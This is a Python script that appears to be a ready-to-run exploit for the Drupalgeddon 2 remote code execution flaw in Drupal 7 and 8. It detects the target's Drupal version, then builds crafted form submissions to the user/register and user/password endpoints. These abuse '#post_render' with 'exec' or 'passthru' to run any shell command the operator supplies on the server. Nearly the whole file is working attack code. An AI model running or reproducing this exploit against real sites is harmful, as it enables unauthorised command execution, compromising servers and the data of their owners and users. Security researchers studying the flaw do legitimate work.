import requests
import urllib
from bs4 import BeautifulSoup
import json
import argparse


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Drupalgeddon2:
	drupal_8_method = "exec"
	drupal_7_method = "passthru"
	method = drupal_7_method
	secure_request = True
	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
	
	def __init__(self, base_url,version,clean_url,insecure_request):
		self.base_url = base_url
		self.clean_url = clean_url
		if insecure_request:
			self.secure_request = False
		if not version and self.identify():
			self.log("Found Drupal Version: %s" % self.version,bcolors.OKGREEN)
			self.log("Major: %s" % self.major_version,bcolors.OKGREEN)
		elif version:
			self.major_version = int(version)
			self.version = str(version)
			self.log("Drupal Version %s passed" % self.major_version,bcolors.OKGREEN)
		else:
			self.log("No Drupal Version detected",bcolors.OKGREEN)
			self.quitRoutine()
		
		
	def log(self,str,color_index):
		print(color_index + str + bcolors.ENDC)
	
	
	def identify(self):
		urls = ["CHANGELOG.txt", "core/CHANGELOG.txt"]		
		for url in urls:
			changelog_url  = "%s/%s" % (self.base_url,url)
			changelog_data = self.sendGetRequest(changelog_url,False)
			
			for line in changelog_data.iter_lines():
				if line.startswith('Drupal'):
					self.version = line.strip().split(",")[0].replace("Drupal ","");
					self.major_version = self.version[0]
					return self.major_version
					
		urls_403 = ["includes/bootstrap.inc","core/includes/bootstrap.inc"]
		for url in urls_403:
			url_403  = "%s/%s" % (self.base_url,url)
			data_403 = self.sendGetRequest(url_403,False)
			html_page = BeautifulSoup(data_403.content, 'html.parser')
				
			for tag in html_page.find_all("meta"):
				if tag.get("name", None) == "Generator":
					generator =  tag.get("content", None)
					if int(generator.strip().split("(")[0].replace("Drupal ","")):
						self.major_version = int(generator.strip().split("(")[0].replace("Drupal ",""));
						return self.major_version
		return False
		

		
	def runCommand(self,command):
		if int(self.major_version) == 7:
			self.drupal7Routine(command)
		elif int(self.major_version) == 8:
			self.drupal8Routine(command)
		else:
			self.log("Drupal was not detected",bcolors.FAIL);
			self.quitRoutine()

			
	def quitRoutine(self):
		self.log("Quitting Application",bcolors.FAIL);
		exit(0);
			
	def drupal8Routine(self,command):
		self.log("Running Drupal 8 Exploit",bcolors.OKBLUE);
		filthy_response = self.generateExploitUrlD8(command,False)
		self.processContent(filthy_response)
		#self.log(filthy_response.content,bcolors.OKGREEN)
		
	def drupal7Routine(self,command):
		self.log("Running Drupal 7 Exploit",bcolors.OKBLUE);
		exploit_url = self.generateExploitUrlD7(command,False)
		form_build_id = self.getFormBuildID(exploit_url)
		if not form_build_id:
			self.log("No form build id found. Aborting",bcolors.FAIL)
			self.quitRoutine()
		if form_build_id:
			if not self.clean_url:
				filthy_url = self.base_url + "?q=file/ajax/name/%23value/" + form_build_id
			else:
				filthy_url = self.base_url + "/file/ajax/name/%23value/" + form_build_id
			filthy_data = {'form_build_id': form_build_id}
			filthy_response = self.sendPostRequest(filthy_url,filthy_data,False)
			self.processContent(filthy_response)
			#self.log(filthy_response.content,bcolors.OKGREEN)
			
	def generateExploitUrlD8(self,command,verbose=False):
		url = self.base_url+"/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
		data = {'form_id': 'user_register_form', '_drupal_ajax': 1,'mail[a][#post_render][]': self.method,'mail[a][#type]':'markup','mail[a][#markup]':command}
		if verbose:
			self.log((" * Running Command: %s") % command,bcolors.OKBLUE)
		return self.sendPostRequest(url,data)

		
	def generateExploitUrlD7(self,command,verbose=False):
		if self.clean_url:
			url = self.base_url+"/user/password?name[%23post_render][]="+self.method+"&name[%23type]=markup&name[%23markup]="+command
		else:
			url = self.base_url+"?q=user/password&name[%23post_render][]="+self.method+"&name[%23type]=markup&name[%23markup]="+command
		data = {'form_id': 'user_pass', '_triggering_element_name': 'name'}
		if verbose:
			self.log((" * Running Command: %s") % command,bcolors.OKBLUE)
		return self.sendPostRequest(url,data)
		
		
	def getFormBuildID(self,response):
		html_page = BeautifulSoup(response.content, 'html.parser')
		inputTags = html_page.findAll(attrs={"name" : "form_build_id"})
		for inputTag in inputTags:
			if inputTag['value']:
				self.log("Found Form Build ID: %s" % inputTag['value'],bcolors.OKGREEN)
				return inputTag['value']
		return False
		

	def sendPostRequest(self,url,post_data,verbose=False):
		self.log("[POST] Loading from %s" % url,bcolors.OKBLUE)
		
		r = requests.post(url, headers=self.headers , data=post_data, verify=self.secure_request)

		if verbose:
			self.processContent(r)
			#self.log(r.content,bcolors.HEADER)
		return r
		
	def sendGetRequest(self,url,verbose=False):
		if verbose:
			self.log("[GET] Loading from %s" % url ,bcolors.OKBLUE)
			
		r = requests.get(url, headers=self.headers, verify=self.secure_request)
		
		if verbose:
			self.log("Status %s" % r.status_code ,bcolors.OKBLUE)
			self.log("Reason %s" % r.reason ,bcolors.OKBLUE)
			self.processContent(r)
			#self.log(r.content,bcolors.HEADER)
		return r

	def processContent(self,data):
		success = False
		for line in data.iter_lines():
			if not '[{"command"' in line:
				self.log("[RESULT] %s" % line ,bcolors.OKGREEN)
				success = True
			else:
				break
				
		if not success:
			self.log("[RESULT] NO Luck this time"  ,bcolors.FAIL)
			
				
			

parser = argparse.ArgumentParser("python drupageddon2.py",description="Drupalgeddon 2 - Exploit Test")
parser.add_argument("url", help="Enter the url to the drupal site", type=str)
parser.add_argument("-c", '--command',help="Enter the command you wish to execute on the site", type=str)
parser.add_argument('-v', '--version',help="Pass the drupal version",type=int)
parser.add_argument('-n', '--nocleanurl',help="Disable clean url requests",action='store_true')
parser.add_argument('-s', '--ssldisable',help="Disable ssl verification",action='store_true')
args = parser.parse_args()

if args.nocleanurl:
	clean_url = False
else:
	clean_url = True
		
		
drupal = Drupalgeddon2(args.url,args.version,clean_url,args.ssldisable)
if args.command:
	print "* Command: %s" % args.command
	drupal.runCommand(args.command);
else:
	print "* Command: whoami"
	drupal.runCommand("whoami");